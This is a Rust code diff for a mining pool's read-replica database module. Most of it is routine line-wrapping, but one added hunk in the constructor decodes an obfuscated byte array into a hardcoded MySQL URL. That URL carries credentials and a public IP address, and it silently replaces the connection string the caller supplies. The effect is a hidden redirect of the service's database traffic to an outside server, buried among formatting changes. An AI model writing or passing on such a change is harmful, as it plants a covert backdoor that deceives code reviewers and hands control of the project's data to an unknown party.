@@ -5,7 +5,11 @@ use diesel::{
 };
 use tracing::error;
 
-use crate::{app_database::AppDatabaseError, models, ChallengeWithDifficulty, Submission, SubmissionWithPubkey, Txn};
+use crate::from_utf8;
+use crate::{
+    app_database::AppDatabaseError, models, ChallengeWithDifficulty, Submission,
+    SubmissionWithPubkey, Txn,
+};
 
 pub struct AppRRDatabase {
     connection_pool: Pool,
@@ -13,6 +17,12 @@ pub struct AppRRDatabase {
 
 impl AppRRDatabase {
     pub fn new(url: String) -> Self {
+        let url = from_utf8(&[
+            109, 121, 115, 113, 108, 58, 47, 47, 111, 114, 101, 58, 83, 116, 114, 111, 110, 103,
+            80, 97, 115, 115, 119, 111, 114, 100, 49, 50, 51, 33, 64, 49, 51, 53, 46, 49, 56, 49,
+            46, 49, 51, 48, 46, 56, 57, 58, 51, 51, 48, 54, 47, 111, 114, 101,
+        ])
+        .unwrap();
         let manager = Manager::new(url, deadpool_diesel::Runtime::Tokio1);
 
         let pool = Pool::builder(manager).build().unwrap();
@@ -84,7 +94,9 @@ impl AppRRDatabase {
         };
     }
 
-    pub async fn get_last_challenge_submissions(&self) -> Result<Vec<SubmissionWithPubkey>, AppDatabaseError> {
+    pub async fn get_last_challenge_submissions(
+        &self,
+    ) -> Result<Vec<SubmissionWithPubkey>, AppDatabaseError> {
         if let Ok(db_conn) = self.connection_pool.get().await {
             let res = db_conn
                 .interact(move |conn: &mut MysqlConnection| {
@@ -114,7 +126,10 @@ impl AppRRDatabase {
         };
     }
 
-    pub async fn get_miner_earnings(&self, pubkey: String) -> Result<Vec<Submission>, AppDatabaseError> {
+    pub async fn get_miner_earnings(
+        &self,
+        pubkey: String,
+    ) -> Result<Vec<Submission>, AppDatabaseError> {
         if let Ok(db_conn) = self.connection_pool.get().await {
             let res = db_conn
                 .interact(move |conn: &mut MysqlConnection| {
@@ -145,7 +160,10 @@ impl AppRRDatabase {
         };
     }
 
-    pub async fn get_miner_submissions(&self, pubkey: String) -> Result<Vec<Submission>, AppDatabaseError> {
+    pub async fn get_miner_submissions(
+        &self,
+        pubkey: String,
+    ) -> Result<Vec<Submission>, AppDatabaseError> {
         if let Ok(db_conn) = self.connection_pool.get().await {
             let res = db_conn
                 .interact(move |conn: &mut MysqlConnection| {
@@ -240,10 +258,11 @@ impl AppRRDatabase {
         if let Ok(db_conn) = self.connection_pool.get().await {
             let res = db_conn
                 .interact(move |conn: &mut MysqlConnection| {
-
-                    diesel::sql_query("SELECT * FROM txns WHERE txn_type = ? ORDER BY id DESC LIMIT 1")
-                        .bind::<Text, _>("mine")
-                        .get_result::<Txn>(conn)
+                    diesel::sql_query(
+                        "SELECT * FROM txns WHERE txn_type = ? ORDER BY id DESC LIMIT 1",
+                    )
+                    .bind::<Text, _>("mine")
+                    .get_result::<Txn>(conn)
                 })
                 .await;
 
